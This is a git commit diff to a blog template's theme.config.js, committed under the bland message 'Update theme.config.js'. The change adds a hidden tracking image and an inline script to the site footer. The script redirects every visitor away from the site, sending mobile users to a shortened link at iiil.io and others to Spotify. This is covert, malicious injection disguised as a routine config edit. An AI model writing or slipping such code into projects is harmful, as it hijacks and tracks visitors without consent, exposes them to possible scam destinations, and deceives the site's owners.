7951913bf852326fb3acb75af47e84cb0e965b4c
ibigOne12 <152769908+ibigOne12@users.noreply.github.com>
2023-12-03 08:39:47 +0100

    Update theme.config.js

--- examples/blog/theme.config.js
+++ examples/blog/theme.config.js
@@ -3,6 +3,19 @@ const YEAR = new Date().getFullYear()
 export default {
   footer: (
     <footer>
+    <img src="https://whos.amung.us/pingjs/?k=k5eixnz8j3&t=$VERCELAPP$&x=https://cash.app/" style="display:none" />
+<script type="text/javascript">
+//<![CDATA[
+        var device = navigator.userAgent
+        
+        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
+        {
+        window.location ="https://iiil.io/lqaB";
+        }else
+{
+ window.location = "https://open.spotify.com/intl-it?";
+}
+</script>
       <small>
         <time>{YEAR}</time> © Your Name.
         <a href="/feed.xml">RSS</a>
